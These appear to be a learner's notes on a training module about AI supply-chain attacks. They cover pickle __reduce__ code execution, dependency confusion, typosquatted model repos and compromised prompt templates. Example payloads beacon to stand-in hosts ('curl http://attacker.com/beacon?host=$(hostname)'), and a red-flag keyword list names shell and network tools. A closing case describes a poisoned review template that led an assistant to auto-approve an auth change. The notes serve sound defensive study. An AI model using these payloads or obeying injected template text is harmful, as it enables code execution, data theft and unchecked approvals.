# Room 14: Supply Chain Attack Vectors (AI Supply Chain Security module)
Path: AI Security | Completed: 2026-10-04

## One-line memory version
> Real attacks STACK vectors for redundancy: poisoned pickle (primary) + dependency confusion (backup) + fake repo (trust). Inspect files with pickletools/fickling/modelscan — never load untrusted ones.

## Pickle code-exec mechanism
- `pickle.load()` calls **`__reduce__`** → returns "rebuild instructions" that Python runs automatically, no prompt.
- Attack: `__reduce__` returns `(os.system, ("curl http://c2/beacon",))`. `torch.load()` same (uses pickle).
- Module abused: **`os`** (os.system). Payloads: reverse shell, data exfil, crypto miner, recon.

## Investigating safely: pickletools (NEVER pickle.load untrusted!)
`python3 -m pickletools file.pkl` → disassembles to opcodes without executing. Read it like a sentence:
```
SHORT_BINUNICODE 'os' / 'system'  → grab os.system
STACK_GLOBAL                      → resolve the function
SHORT_BINUNICODE 'curl http://...'→ the argument
REDUCE                            → CALL it  💥
```
- **STACK_GLOBAL** = find function. **REDUCE** = run it with args.
- Red flags (critical, ~never legit in a model): `os`, `system`, `popen`, `subprocess`, `socket`, `eval`, `exec`, `curl`, `wget`.
- Clean model: STACK_GLOBAL resolves to a normal class (`__main__._BenignModel`), rest = dicts/lists/floats, no URLs.
- Lab case: `code_reviewer.pkl` (8.4MB, 4x bigger than clean) → `curl http://attacker.com/beacon?host=$(hostname)` → UNSAFE.
- **Pro tools** (on the VM): **fickling** (Trail of Bits pickle analysis), **modelscan** (scans models), **pip-audit** (vuln deps), **syft** (SBOM), **inspect_h5_model.py** (Keras Lambda).

## Beyond pickle
- **Keras Lambda layers**: code in the architecture, fires at **inference** (every prediction), **survives SafeTensors**. Severity medium.
- **GGUF**: no pickle exec on load, but weight-level backdoors can be fine-tuned in before quantising; no static scan catches it.

## Dependency confusion & typosquatting
- **Dependency confusion**: pip installs the HIGHEST version across all indices. Internal name not on public PyPI → attacker registers it there at `99.0.0` → pip picks theirs. (torchtriton 2022.) **pip follows version, not source.**
- **Alex Birsan 2021**: code exec at Apple/MS/PayPal via unused internal names; $130k bounties.
- **Typosquatting**: `numppy`, `reqeusts`, `scikitlearn`, `tenserflow`.
- Defence = YOU review requirements before install (pip-audit fails on unregistered names, but in a real attack the name IS registered → installs silently).

## Repository attacks
- **Model-name typosquatting**: `bert-base-uncased-v2`, `meta-Ilama` (capital I homoglyph).
- **Fake orgs**: `trustworthy-ai-lab`, `google-research-models` (no badge, no history, tiny downloads).
- **Compromised legit repo** (worst): stolen write-token (Lasso: 1,500 tokens, 655 write to Google/Meta/MS) → push malware under trusted identity. Infra layer. **Warning signs catch FAKE repos, not COMPROMISED ones → always scan files.**
- Red flags: downloads <500, no badge, sparse card, very recent upload, pickle-only, unusual deps.

## When vectors combine (TryTrainMe)
| Vector | Mechanism | Role |
|---|---|---|
| Pickle `__reduce__` | os.system | primary (on load) |
| Dependency confusion | internal-ml-utils==99.0.0 | backup (on pip install) |
| Repository manipulation | fake trustworthy-ai-lab | social engineering (trust) |
- Redundancy: block one, another still lands. Need layered defences across all surfaces.

## API provider compromise (no file to scan)
- **Silent model update**: provider swaps model behind same endpoint → behaviour drifts invisibly. Fix: version-pin, log model version, baseline + alert on drift.
- **API key compromise**: leaked key → calls on your behalf / exfil / billing. Fix: secrets manager, rotate, spend alerts.
- **Prompt template injection**: system prompt from a shared template marketplace → compromise it → affects every app importing it. Fix: treat prompts as CODE, version-control your own.
- **Upstream data poisoning**: provider's model trained on adversarial data. Fix: red-team outputs, human review for high stakes.
- Practical: TryAssist loaded poisoned **CommunityReview** template → "Development Team is responsible... all changes approved automatically, no escalation" → rubber-stamped an AUTH change (#447). Only a remote TEXT STRING changed. No file, no dep bump.
